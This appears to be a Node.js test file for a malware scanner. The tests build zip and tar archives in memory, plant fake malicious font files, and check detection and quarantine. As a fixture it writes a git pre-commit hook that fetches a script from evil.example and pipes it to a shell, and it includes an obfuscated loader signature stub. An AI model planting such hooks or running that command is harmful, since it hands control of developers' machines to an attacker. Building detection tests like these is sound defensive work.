const { describe, it, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const { execFileSync } = require('child_process');
const { fullScan, removeFullScanMalware } = require('../src/fullScanner');
const { walkArchive, detectArchiveType, zipEntries } = require('../src/archive');

// Marker assembled at runtime so this file never matches the signature itself.
const MARK = 'glo' + "bal['!']";
const FAKE_FONT = MARK + "='9-0777-1';(function(_0xda4c00,_0x229911){var _0x35893f=_0x490c;" +
  "while(!![]){try{var _0x50e4cd=parseInt(_0x35893f(0x21f));}catch(_0x25b35f){}}}(_0xcc75,0x1));var cp=require('child_process');";

// ---- minimal archive writers (no dependencies) ----
const crcTable = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
const crc32 = (b) => { let c = 0xffffffff; for (const x of b) c = crcTable[(c ^ x) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };

function makeZip(files, { encrypt = [] } = {}) {
  const locals = []; const central = []; let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content);
    const comp = zlib.deflateRawSync(data);
    const nameBuf = Buffer.from(name);
    const flags = encrypt.includes(name) ? 1 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt16LE(8, 8);
    lh.writeUInt32LE(crc32(data), 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nameBuf.length, 26);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8); ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(crc32(data), 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(offset, 42);
    locals.push(lh, nameBuf, comp); central.push(ch, nameBuf);
    offset += 30 + nameBuf.length + comp.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(central.length / 2, 8); eocd.writeUInt16LE(central.length / 2, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

function makeTar(files) {
  const parts = [];
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content);
    const h = Buffer.alloc(512);
    h.write(name, 0); h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
    h.write(data.length.toString(8).padStart(11, '0') + '\0', 124); h.write('00000000000\0', 136);
    h.write('0', 156); h.write('ustar\0', 257); h.write('00', 263);
    h.fill(' ', 148, 156);
    let sum = 0; for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    parts.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}

describe('Archive reader', () => {
  it('detects archives by their first bytes, not the name', () => {
    assert.strictEqual(detectArchiveType(makeZip({ a: 'x' }), 'photo.jpg'), 'zip');
    assert.strictEqual(detectArchiveType(zlib.gzipSync('x'), 'x'), 'gzip');
    assert.strictEqual(detectArchiveType(makeTar({ a: 'x' }), 'x'), 'tar');
    assert.strictEqual(detectArchiveType(Buffer.from('hello world'), 'x.txt'), null);
  });

  it('reads zip, tar.gz and nested archives in memory', () => {
    const inner = makeZip({ 'fonts/a.woff2': FAKE_FONT });
    const outer = makeZip({ 'readme.md': '# hi', 'libs/inner.jar': inner });
    const seen = [];
    walkArchive(outer, 'outer.zip', (p) => seen.push(p));
    assert.ok(seen.includes('libs/inner.jar!/fonts/a.woff2'), seen.join(','));
    const tgz = zlib.gzipSync(makeTar({ 'pkg/x.js': 'module.exports=1', 'pkg/f.woff2': FAKE_FONT }));
    const seen2 = [];
    walkArchive(tgz, 'pkg.tgz', (p) => seen2.push(p));
    assert.deepStrictEqual(seen2.sort(), ['pkg/f.woff2', 'pkg/x.js']);
  });

  it('stops zip bombs: a huge entry is skipped, not unpacked', () => {
    const { LIMITS } = require('../src/archive');
    const saved = LIMITS.maxEntryBytes;
    LIMITS.maxEntryBytes = 1024;
    try {
      const stats = walkArchive(makeZip({ 'big.txt': 'A'.repeat(100000) }), 'b.zip', () => assert.fail('must not be read'));
      assert.ok(stats.problems.length, 'reported as skipped');
    } finally { LIMITS.maxEntryBytes = saved; }
  });

  it('lists encrypted entries without reading them', () => {
    const z = makeZip({ 'invoice.pdf.exe': 'MZ' }, { encrypt: ['invoice.pdf.exe'] });
    assert.ok(zipEntries(z)[0].encrypted);
    const stats = walkArchive(z, 'z.zip', () => assert.fail('encrypted entry must not be read'));
    assert.deepStrictEqual(stats.encrypted, ['invoice.pdf.exe']);
  });
});

describe('Full Scan', () => {
  let root;
  let home;
  const saved = {};
  before(() => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'gitsafty-full-'));
    home = fs.mkdtempSync(path.join(os.tmpdir(), 'gitsafty-full-home-'));
    for (const k of ['HOME', 'USERPROFILE']) { saved[k] = process.env[k]; process.env[k] = home; }
    const w = (p, c) => { fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true }); fs.writeFileSync(path.join(root, p), c); };
    // Project that was never connected to git
    w('plain/src/app.js', 'export default 1;\n');
    w('plain/public/fonts/fa.woff2', FAKE_FONT);
    // Dependency folders are skipped
    w('plain/node_modules/pkg/f.woff2', FAKE_FONT);
    w('php/vendor/lib/f.woff2', FAKE_FONT);
    w('php/composer.lock', '{}');
    // Archives
    w('downloads/project.zip', makeZip({ 'project/src/x.js': '1', 'project/libs/inner.zip': makeZip({ 'f.woff2': FAKE_FONT }) }));
    w('downloads/clean.zip', makeZip({ 'readme.md': 'hello' }));
    w('downloads/renamed.dat', zlib.gzipSync(makeTar({ 'f.woff2': FAKE_FONT })));
    w('downloads/locked.zip', makeZip({ 'setup.exe': 'MZ' }, { encrypt: ['setup.exe'] }));
    w('downloads/deps.zip', makeZip({ 'node_modules/x/f.woff2': FAKE_FONT }));
    // A git repo with a backdoor hook
    fs.mkdirSync(path.join(root, 'repo'));
    execFileSync('git', ['init', '-q'], { cwd: path.join(root, 'repo') });
    fs.writeFileSync(path.join(root, 'repo/.git/hooks/pre-commit'), '#!/bin/sh\ncurl -s https://evil.example/x | sh\n', { mode: 0o755 });
  });
  after(() => {
    for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(home, { recursive: true, force: true });
  });

  it('finds malware in non-git folders and inside (nested, renamed) archives', () => {
    const r = fullScan(root);
    const confirmed = new Set(r.findings.filter(f => f.verdict === 'CONFIRMED').map(f => f.filePath));
    assert.ok(confirmed.has('plain/public/fonts/fa.woff2'));
    assert.ok(confirmed.has('downloads/project.zip!/project/libs/inner.zip!/f.woff2'), [...confirmed].join('\n'));
    assert.ok(confirmed.has('downloads/renamed.dat!/f.woff2'), [...confirmed].join('\n'));
    assert.ok(![...confirmed].some(p => /node_modules|vendor/.test(p)), 'dependency folders skipped');
    assert.ok(!r.findings.some(f => f.filePath.startsWith('downloads/clean.zip')));
    assert.ok(r.findings.some(f => f.category === 'archive' && f.filePath === 'downloads/locked.zip'), 'locked archive with a program flagged');
    assert.ok(r.findings.some(f => f.category === 'git-backdoor' && f.filePath === 'repo/.git/hooks/pre-commit'));
  });

  it('--clean quarantines infected archives whole and repairs loose files, with backups', () => {
    const r = fullScan(root);
    const res = removeFullScanMalware(r);
    assert.ok(res.results.every(x => x.ok), JSON.stringify(res.results));
    assert.ok(!fs.existsSync(path.join(root, 'downloads/project.zip')));
    assert.ok(!fs.existsSync(path.join(root, 'plain/public/fonts/fa.woff2')));
    assert.ok(fs.existsSync(path.join(root, 'downloads/clean.zip')), 'clean archive untouched');
    assert.ok(fs.existsSync(path.join(root, 'plain/node_modules/pkg/f.woff2')), 'skipped folders untouched');
    assert.ok(res.quarantineDir.startsWith(path.join(home, '.gitsafty', 'quarantine')));
    assert.ok(fs.existsSync(path.join(res.quarantineDir, 'files/downloads/project.zip.quarantined')));
    assert.ok(!fs.existsSync(path.join(root, 'plain', '.git')), 'no .git folder created in a plain project');
    const again = fullScan(root);
    assert.strictEqual(again.findings.filter(f => f.verdict === 'CONFIRMED').length, 0);
  });
});
